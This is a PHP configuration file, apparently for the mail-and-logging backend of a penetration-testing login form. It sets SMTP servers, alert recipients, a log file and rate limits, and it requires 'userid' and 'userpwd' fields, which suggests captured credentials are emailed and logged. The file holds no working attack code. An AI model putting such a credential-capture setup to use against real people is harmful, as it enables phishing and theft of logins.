<?php
/**
 * Configuration file for SMTP Handler
 * For ethical penetration testing purposes only
 */

return [
    // SMTP Server Configuration
    'smtp' => [
        'servers' => [
            ['host' => 'localhost', 'port' => 25],
            ['host' => '127.0.0.1', 'port' => 25],
            ['host' => 'mail.example.com', 'port' => 25], // Add your SMTP server
        ],
        'timeout' => 30,
        'use_auth' => false, // Set to true if SMTP requires authentication
        'username' => '', // SMTP username if auth is enabled
        'password' => '', // SMTP password if auth is enabled
    ],
    
    // Email Configuration
    'email' => [
        'from' => 'pentest@test.local',
        'to' => ['admin@test.local', 'security@test.local'], // Multiple recipients
        'subject_prefix' => '[PENTEST ALERT]',
        'enable_notifications' => true,
    ],
    
    // Logging Configuration
    'logging' => [
        'enabled' => true,
        'file' => 'pentest_log.txt',
        'max_size' => 5 * 1024 * 1024, // 5MB
        'retention_days' => 30,
        'log_level' => 'INFO', // DEBUG, INFO, WARN, ERROR
    ],
    
    // Security Configuration
    'security' => [
        'rate_limit' => [
            'enabled' => true,
            'max_attempts_per_ip' => 10,
            'window_seconds' => 3600, // 1 hour
        ],
        'honeypot_field' => 'website',
        'csrf_protection' => false, // Enable if needed
        'ip_whitelist' => [], // Add IPs to whitelist if needed
        'ip_blacklist' => [], // Add IPs to blacklist if needed
    ],
    
    // Testing Configuration
    'testing' => [
        'simulate_failures' => false,
        'test_mode' => false,
        'debug_output' => false,
    ],
    
    // Form Processing
    'form' => [
        'required_fields' => ['userid', 'userpwd'],
        'optional_fields' => ['rememberme'],
        'max_field_length' => 255,
        'allowed_domains' => [], // Empty means all domains allowed
    ],
];
?>